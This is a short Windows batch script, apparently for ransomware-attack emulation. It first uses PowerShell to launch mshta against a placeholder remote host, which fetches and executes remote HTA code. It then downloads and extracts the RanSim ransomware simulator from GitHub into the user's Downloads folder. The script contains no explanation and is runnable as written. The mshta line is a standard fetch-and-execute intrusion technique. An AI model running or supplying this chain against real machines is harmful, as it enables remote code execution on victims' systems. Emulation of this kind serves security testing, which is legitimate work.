@echo off
setlocal
powershell.exe -Command "mshta http://<ip address>/<endpoint>"
rem Define variables
rem installing the RanSim from the github
set "githubUrl=https://github.com/lawndoc/RanSim/archive/main.zip"
set "outputPath=%USERPROFILE%\Downloads\ransom.zip"
set "extractPath=%USERPROFILE%\Downloads\"

rem Download the ZIP archive
powershell.exe -command "Invoke-WebRequest -Uri %githubUrl% -OutFile %outputPath%"

rem Extract the contents of the ZIP archive
powershell.exe -command "Expand-Archive -Path %outputPath% -DestinationPath %extractPath% -Force"
endlocal
pause
